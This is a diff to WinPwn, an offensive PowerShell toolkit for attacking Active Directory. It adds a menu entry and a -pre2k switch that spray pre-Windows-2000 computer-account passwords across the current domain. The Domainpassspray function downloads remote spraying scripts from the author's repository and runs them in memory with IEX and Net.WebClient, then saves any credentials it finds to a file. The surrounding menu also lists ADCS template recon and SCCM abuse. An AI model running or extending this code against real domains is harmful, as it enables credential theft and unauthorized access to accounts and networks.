@@ -2315,7 +2315,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '27. Enumerate ADCS Template informations and permissions via Certify!'
         Write-Host -ForegroundColor Green '28. Check LDAP/LDAPS Signing and or Channel Binding'
         Write-Host -ForegroundColor Green '29. (Ab)use some SCCM stuff'
-        Write-Host -ForegroundColor Green '30. Go back '
+	Write-Host -ForegroundColor Green '30. Spray pre2k passwords'
+        Write-Host -ForegroundColor Green '31. Go back '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2351,9 +2352,10 @@ __        ___       ____
          27{Invoke-ADCSTemplateRecon}
          28{LDAPChecksMenu}
          29{SCCMMenu}
+	 30{Domainpassspray -pre2k}
        }
     }
-  While ($masterquestion -ne 30)
+  While ($masterquestion -ne 31)
 }
 
 function SCCMMenu
@@ -4395,12 +4397,25 @@ function Domainpassspray
     [Switch]
         $usernameaspassword,
         [String]
-        $password   
-    )
+        $password,   
+    [Switch]
+        $pre2k
+)
+    
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
     $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+
+    if($pre2k)
+    {
+        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Pre2kSpray.ps1')
+	if(!$consoleoutput){Invoke-Pre2kSpray -Force -outfile $currentPath\Exploitation\Pre2kPasswords.txt}
+	else
+	{
+	  Invoke-Pre2kSpray -Force
+	}
+    }
     
     if ($emptypasswords)
     {
